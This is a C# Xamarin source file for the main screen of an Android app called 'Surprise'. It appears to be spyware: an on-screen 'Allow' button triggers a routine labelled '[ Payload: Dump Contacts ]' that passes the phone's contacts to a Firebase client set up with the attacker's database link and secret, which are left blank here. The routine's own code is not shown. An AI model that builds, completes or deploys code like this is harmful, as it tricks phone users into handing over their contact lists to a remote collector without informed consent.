
using Android.App;
using Android.OS;
using Android.Runtime;
using Android.Views;
using Android.Widget;
using AndroidX.AppCompat.App;
using Firebase.Database;
using System;
using System.IO;
using System.Threading.Tasks;

namespace Surprise
{
    [Activity(Label = "@string/app_name", Theme = "@style/AppTheme.NoActionBar", MainLauncher = true)]
    public partial class MainActivity : AppCompatActivity
    {
        // [ Server Credentials ]
        static string database = ""; // Google Firebase Database Link
        static string database_secret = ""; // Databse Secret for Authentication

        // [ Temporary Paths ]
        string tempContactsPath = Path.Combine(System.Environment.GetFolderPath(System.Environment.SpecialFolder.ApplicationData), "contactsPath.txt");

        // [ Services ]
        ContactService_Android contactService_Android = new ContactService_Android();
        Payloads paylaods = new Payloads();
        public FirebaseClient fc = new FirebaseClient(database,
                           new FirebaseOptions { AuthTokenAsyncFactory = () => Task.FromResult(database_secret) });


        protected override void OnCreate(Bundle savedInstanceState)
        {
            // [ Starting Point ]

            base.OnCreate(savedInstanceState);
            Xamarin.Essentials.Platform.Init(this, savedInstanceState);
            SetContentView(Resource.Layout.activity_main);

            // Set Main Button's Function
            FindViewById<Button>(Resource.Id.AllowBTN).Click += AllowBTNOnClick;

            // Connecting to Database
            //while (database.Connect() != 0) ;
        }

        public override bool OnCreateOptionsMenu(IMenu menu)
        {
            MenuInflater.Inflate(Resource.Menu.menu_main, menu);
            return true;
        }

        // Mail Button CLick Event
        private async void AllowBTNOnClick(object sender, EventArgs eventArgs)
        {
            // [ Payload: Dump Contacts ]
            paylaods.DumpContacts(this, contactService_Android, fc, tempContactsPath, 2000);

        }

        public override void OnRequestPermissionsResult(int requestCode, string[] permissions, [GeneratedEnum] Android.Content.PM.Permission[] grantResults)
        {
            Xamarin.Essentials.Platform.OnRequestPermissionsResult(requestCode, permissions, grantResults);

            base.OnRequestPermissionsResult(requestCode, permissions, grantResults);
        }
    }
}
